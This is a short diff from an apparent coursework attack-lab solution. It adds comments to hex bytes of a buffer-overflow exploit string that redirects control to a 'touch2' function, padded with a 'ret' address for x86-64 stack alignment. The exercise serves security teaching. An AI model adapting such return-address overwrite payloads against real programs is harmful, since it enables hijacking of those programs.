@@ -22,5 +22,6 @@ c3                   /* ret */
 /* then we need to jump our code to touch2 function */
 /* so that we pass cookie as the argument to touch2 function */
 /* the address of touch2 function is 0x808a2c */
- fd 89 80 00 00 00 00 00 
+ fd 89 80 00 00 00 00 00 /* a "ret" code in assemble code */
+ /* in order to fit the 16 bytes return align in x86-64 architecture */
  2c 8a 80 00 00 00 00 00
